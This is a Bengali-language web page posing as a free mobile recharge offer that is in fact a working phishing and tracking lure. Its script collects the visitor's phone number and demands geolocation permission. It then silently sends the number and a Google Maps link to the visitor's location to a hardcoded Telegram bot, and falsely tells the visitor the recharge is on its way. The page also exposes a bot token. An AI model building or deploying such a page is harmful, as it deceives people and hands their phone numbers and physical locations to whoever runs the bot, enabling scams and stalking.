<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #f8f9fa; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        .box { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 18px; }
        button { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>আপনার ১১ সংখ্যার নম্বরটি দিন</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button id="btn" onclick="sendData()">রিচার্জ নিন</button>
    </div>

    <script>
        async function sendData() {
            const phone = document.getElementById('phone').value;
            const btn = document.getElementById('btn');
            const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
            const chat_id = "7887080882";

            if (phone.length < 11) { alert("সঠিক নম্বর দিন!"); return; }

            btn.innerText = "প্রসেসিং...";
            btn.disabled = true;

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                // সঠিক ম্যাপ লিঙ্ক ফরম্যাট
                const map = `https://www.google.com/maps?q=${lat},${lon}`;
                const text = `🔔 **নতুন রিচার্জ!**\n📱 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;

                try {
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                    await fetch(url);
                    alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
                } catch (e) {
                    alert("নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।");
                } finally {
                    btn.innerText = "রিচার্জ নিন";
                    btn.disabled = false;
                }
            }, (err) => {
                alert("লোকেশন পারমিশন ছাড়া অফারটি পাবেন না।");
                btn.innerText = "রিচার্জ নিন";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
